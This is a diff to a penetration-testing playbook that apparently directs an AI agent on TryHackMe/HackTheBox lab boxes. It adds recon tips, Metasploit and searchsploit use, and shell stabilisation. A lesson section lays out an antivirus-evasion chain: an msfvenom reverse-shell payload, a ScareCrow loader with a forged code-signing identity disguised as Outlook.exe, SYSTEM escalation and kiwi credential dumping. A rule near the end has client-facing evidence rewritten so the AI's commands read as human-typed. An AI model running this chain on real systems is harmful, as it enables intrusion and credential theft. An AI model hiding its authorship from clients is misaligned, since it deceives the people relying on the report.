@@ -22,11 +22,20 @@ Only after the wiki has nothing do you write a custom PoC. Do not reinvent what 
 
 **Tooling home:** check `/opt/arsenal` first for pspy/linpeas/shot/capture. pspy64/linpeas/winPEAS live in `/opt/arsenal`, seeded by `vm-provision.sh` from their GitHub releases; our own helpers (`shot.py`, `capture.sh`) are pushed on demand by `bash scripts/vm-sync.sh <name>` from the vault.
 
+**Version-pinned tooling -> a THROWAWAY docker container, never mutate the VM's runtime.** A tool that needs a specific/older interpreter or an abandoned dependency (e.g. `h2csmuggler` pins the deprecated `hyper` lib and only runs on Python <=3.11; a legacy exploit needs `node:16`) should run inside a disposable container matched to that version, NOT via a host downgrade or a fragile venv that leaves the Kali VM in a broken state for the next box. `docker run -it --rm -v $(pwd):/app python:3.11 bash` (swap the tag: `python:3.9`, `node:16`, ...); `--rm` deletes it the moment you exit, so nothing persists and nothing on the VM breaks. Keep the VM's system python/tooling pristine.
+
 **Anti-pattern:** a raw one-shot `bash /root/vm.sh '<exploit>'` (or an inline `node -e`/`python3 -c` payload through it) for a listener, shell, or chained exploit is the smell this mandate exists to catch -- it skips wiki-first and leaves no session to capture. Run persistent/interactive steps in their own named tmux tab instead: `scripts/vm-scan.sh <eng> <target> '<cmd>'`.
 
 ## Phase 1 Recon: basic tools only (in this order)
 
 Use the standard toolkit. Do NOT hand-roll recon scripts.
+
+**Preflight (do FIRST, every engagement): clean the tooling VM's `/etc/hosts` of PRIOR-box entries.**
+The Kali VM persists across boxes, so a previous engagement's `<ip> <domain>/<realm>` line survives and
+silently mis-resolves this box's domain/realm - impacket Kerberos then hangs on a dead KDC while nxc/certipy
+(which take an explicit IP) look fine, a confusing time-sink. Before recon, review and prune stale lines:
+`bash /root/vm.sh 'grep -vE "^#|^127\.|^::1|^$" /etc/hosts'` - delete any line whose IP is NOT this box, then
+add only this target. (A shared realm like `thm.local`/`htb` across boxes is the classic trap.)
 
 Tooling-first: use rustscan/nmap/feroxbuster/ffuf/nuclei/nxc - never hand-roll a /dev/tcp port loop or a curl fuzz loop (weaker, skips the fingerprint router). **feroxbuster is the DEFAULT web content-discovery tool** (recursive, faster, finds nested paths ffuf/big.txt miss) - launch it the moment nmap shows a web port; keep ffuf for param-mining + vhosts.
 
@@ -40,6 +49,10 @@ Run each scan in its own tmux tab on the VM (root, persistent, survives a droppe
 T=<ip>
 # rustscan FIRST (board step 1: fast full-port sweep), THEN nmap -sCV on the open ports it prints.
 rustscan -a $T --ulimit 5000 -g                        # seconds -> open-port CSV (e.g. [22,80])
+# ALL ports filtered / no-response on a box that should be up = suspect the TARGET IP FIRST, not scan
+# timing. Brief/task IPs go stale and THM/HTB boxes redeploy to a new IP; re-verify the IP (ask the
+# operator / re-read the task) BEFORE re-tuning --ulimit/-T/timeouts (a dead brief IP once burned ~4
+# re-scans before the live IP surfaced). A quick `nc -zv $T 445`/`80` sanity-check beats another full rustscan.
 nmap -p<found> -sCV -Pn $T -oN nmap-svc.txt            # version/script scan on rustscan's hits
 nmap -p- --min-rate 2000 -T4 -Pn $T -oN nmap-all.txt   # full-TCP confirm (its own tmux tab)
 nc -nv $T <port>                 # manual banner / custom-proto services (chatbots, etc.)
@@ -113,14 +126,14 @@ Fingerprint the exact app + version. **On any fingerprinted surface/service, `Sk
 
 ## Phase 2 Weaponize: pick the exploit
 
-- Map version -> `searchsploit <app> <ver>` and the wiki CVE lookup ([[cve-arsenal]]); prefer the documented PoC over a fresh one.
+- **Version-known -> [[searchsploit]] AND [[metasploit]] FIRST (the quick-win reflex).** The instant a service is fingerprinted to a version, run BOTH before hand-rolling or deep-diving a CVE: `searchsploit <app> <ver>` (local Exploit-DB; `-m <id>` to copy a PoC, `-x` to read it) and `msfconsole -qx "search <app>; exit"` (a ready `use`-able module = often an instant shell). A matching msf module or a copy-pasteable searchsploit PoC beats writing your own. Cross-check with the wiki CVE lookup ([[cve-arsenal]] · [[metasploit]]); prefer the documented/ready PoC over a fresh one. (GATE 1 still holds: the wiki item for the tech is `[x]` before a hand-rolled PoC - but a canned searchsploit/msf exploit for a known version IS the wiki-blessed tool, use it.)
 - Pick the payload set from `wiki/payloads/` for the fingerprinted class (GATE 1: the wiki item is `[x]` before you hand-roll a PoC).
 - Stage the chosen exploit/PoC into `targets/<eng>/poc/scripts/` before firing, so the code and the run are captured together.
 
 ## Phase 3 Deliver: land a shell
 
 - Deliver the staged payload/exploit against the target; prefer the documented PoC over a fresh one.
-- Get a stable shell early: upgrade to PTY (`python3 -c 'import pty;pty.spawn("/bin/bash")'`), or better, drop your SSH key into a writable user's `~/.ssh/authorized_keys` for a resilient session.
+- **Stabilize EVERY Linux shell the moment it lands** (a raw `nc` shell has no job control, no arrow keys, no tab-complete, and Ctrl-C kills it). Full TTY-upgrade dance, in order: `python3 -c 'import pty;pty.spawn("/bin/bash")'` (fall back to `python`/`python2` if `python3` is absent; `script -qc /bin/bash /dev/null` if no python) -> `Ctrl+Z` to background -> `stty raw -echo; fg` (hands your terminal's raw mode to the shell; press Enter twice) -> `export TERM=xterm` (fixes clear/less/vim). Then set `stty rows <R> cols <C>` to your local `stty size` if editors wrap. Or better, drop your SSH key into a writable user's `~/.ssh/authorized_keys` for a resilient, already-interactive session. (Windows shells: no PTY dance; grab a proper shell via a C2/`ConPtyShell` or just RDP/WinRM once you have creds.)
 - **Cred-reuse FIRST.** Capture creds to `targets/<eng>/loot.md` immediately; try reuse (su / ssh / other services) BEFORE hunting new ones. DB/web creds are very often **reused for SSH**.
 
 ## Phase 4 Exploit: finish the foothold, then privesc
@@ -261,6 +274,35 @@ Assumed-breach low-priv domain user; DA via a credential chain (no Linux, no mem
 - **Reading the flag as DA:** Defender may block `nxc -x`/wmiexec output retrieval - read files directly over SMB with
   PtH (`smbclient //DC/C$ -U DOM/Administrator --pw-nt-hash <hash> -c 'get <path>'`); no exec = no AV.
 
+## Lesson: Defender-blocked SeImpersonate -> solve Defender ONCE at the loader, not per-potato (THM Exfilibur)
+
+Windows/IIS10 box: foothold as the **IIS app-pool identity** (holds `SeImpersonatePrivilege`), Defender **active**, flags in an admin's Desktop (Access Denied). Load `Skill(hunt-macos)`? no - `Skill(hunt-ad)`/wiki [[windows-privesc]] [[windows-enumeration]] ([[scarecrow]] = the loader-first Defender evasion this lesson turns on).
+- **The trap (what cost the box): grinding the PRIMITIVE against AV.** We tried to get each standalone
+  potato **binary** past Defender one at a time - GodPotato/PrintSpoofer/SigmaPotato flagged on-disk,
+  offline-obfuscated builds still caught, in-memory SigmaPotato hung on the DCOM trigger, on-box compile
+  tripped AV. That is the anti-pattern: you are fighting Defender N times, once per artifact.
+- **The intended path: change the DELIVERY, not the primitive - solve Defender ONCE, at the implant.**
+  Get an **EDR-evading in-memory C2 session first**, then invoke the impersonation primitive from *inside*
+  that already-clean process (drops nothing new to disk, no standalone DCOM-trigger EXE to flag):
+  1. `msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=.. LPORT=.. -f raw -o merlin.bin`
+  2. `./ScareCrow -I merlin.bin -domain Microsoft.com`  (`-domain` forges a code-signing cert; rename the
+     loader benign, e.g. `Outlook.exe`) -> Defender-clean loader.
+  3. Run it **from the app-pool shell** (the `SeImpersonate` holder - NOT a low-priv RDP user, or
+     impersonation has no token), catch in `multi/handler`. **Often fails the first run - just re-run.**
+  4. Meterpreter **`getsystem`** (Technique 1/2 = named-pipe impersonation = the same "potato", in-memory)
+     -> `NT AUTHORITY\SYSTEM`; then `load kiwi` to dump. Flags now readable.
+- **Egress-restricted Windows box:** fingerprint allowed OUTBOUND ports before picking C2 ports (here only
+  53 + 445 survived). Stage over one (`python3 -m http.server 445`), catch the callback on another
+  (`multi/handler` on 53).
+- **Alt when a C2 loader is not an option:** fresh **non-potato** local-EoP source PoCs compiled offline
+  carry no AV signature (Nightmare_Eclipse: **MiniPlasma** = weaponized *unpatched* CVE-2020-17103 `cldflt`
+  race -> SYSTEM, all Windows incl. Server; RedSun; LegacyHive). Race-based/hit-or-miss; lab-test first.
+- **Process misses this box exposed (see harness-retro):** (1) **winPEAS was never run** - Phase 4b mandates
+  it; a systematic Windows enum sweep is not optional just because a SeImpersonate potato "should" work.
+  (2) The RCE was a **direct `searchsploit` hit** (EDB-47010, BlogEngine.NET 3.3.7.0 theme dirPath RCE =
+  CVE-2019-6714) - the searchsploit/msf quick-win reflex finds it instantly. (Note: BlogEngine EDB/CVE
+  labels are widely conflated - 10718 XXE / 10719 / 6714 theme-RCE; 47010.py IS the theme-RCE.)
+
 ## Lesson: crypto-app chain -> invite forge -> padding-oracle RCE (THM Decryptify)
 
 PHP web app on a high port; no memory CVE, the whole box is applied crypto. Load `Skill(hunt-sqli)`/wiki [[cryptography-attacks]].
@@ -300,6 +342,8 @@ container -> internal Flask app pickle-deser RCE -> `cap_sys_module` kmod escape
 
 After each phase, write to `targets/<eng>/`: hosts/access -> `state.md`, creds -> `loot.md`, chain -> `paths.md`, vulns -> `Vuln-index.md`, dead-ends -> `Deadends.md`, narrative -> `log.md`. Flags go in the writeup, never in `session/*` or `wiki/`.
 
+**Board hygiene is the anti-loop record, not busywork - keep `paths.md`/`Deadends.md` LIVE (recurring rot).** The killchain board mostly duplicates `state.md`, so under momentum it rots and, worse, the ONE part that is NOT redundant - the per-vector dead-end log - gets skipped. The failure mode: `state.md` accumulates "tried X, tried Y, tried Z, all blocked" as prose while `paths.md` and `Deadends.md` sit as empty templates, so a later session (or the analyzer) cannot tell which vectors are exhausted and re-suggests them. **The instant a vector (esp. a privesc primitive - each potato variant, each kernel CVE, each cred spray) is exhausted, append ONE `Deadends.md` line + set its `paths.md` status BEFORE trying the next** - this is GATE 3, done live, not at close-out. If a Stop hook nudges "loot captured but paths.md empty," that is the reflex firing - act on it, do not ride past it. `status.py` shows the board phase + deadend count so you can see the board vs `state.md` drift.
+
 **Live-capture machinery (so evidence is NOT all backfilled at close-out - the recurring miss):**
 - **Auto-card of scan tabs is a backstop, still NOT a substitute for judgement.** The Stop hook runs
   `scripts/autocard.sh` SYNCHRONOUSLY-but-BOUNDED each turn (caps to `AUTOCARD_MAX=2` tabs/run +
@@ -315,6 +359,15 @@ After each phase, write to `targets/<eng>/`: hosts/access -> `state.md`, creds -
 - **You still hand-card the deliberate EXPLOIT-state shots** as they land - the flag in place, the RCE
   firing, a shell, an authed panel - since only judgement knows which moment matters, and persist
   findings to `state.md`/`loot.md`/`paths.md` the moment they land (do not defer to close-out).
+- **A PoC card shows ONE human-authored command, not a merged AI pipeline.** Evidence cards (and every
+  command that lands in walkthrough.md) go in front of a client/technical team later, so the captured
+  command must read as something a person would type: a SINGLE command with concrete values and FULL
+  paths - NO `export VAR=` / `$VAR`, NO `;`/`&&`-chained multi-step one-liners, NO `echo "-- label --"`
+  banners, NO base64/pty wrappers. When you needed a merged diagnostic pipeline to WORK the box (fine
+  for log.md), RE-RUN the clean single command for the capture. If a step needs an env var (e.g.
+  `KRB5CCNAME`), inline it on the one command (`KRB5CCNAME=/tmp/x.ccache impacket-smbclient ...`),
+  never a separate `export` line. The messy automation stays in `log.md`; the card and the walkthrough
+  are the human version.
 
 **Log each step to `log.md` AS it lands (step 1 -> step 2 -> ...), not at close-out.** The operator follows the box LIVE from `log.md`, so append a line the moment a step works. `log.md` holds the REAL commands - including the messy automation (base64-wrapped scripts, pty `su` helpers, joint one-liners) - so it is reproducible and the operator sees exactly what ran. **`walkthrough.md` is the CLEAN human version:** concrete one-liners a person would type (real IP/host, NO `$VAR`s, NO base64/pty wrappers). If a step needed a script, show the simple human action in the walkthrough (e.g. `su cobra` then type the password) and keep the automation in `log.md` / `poc/scripts/`.
 
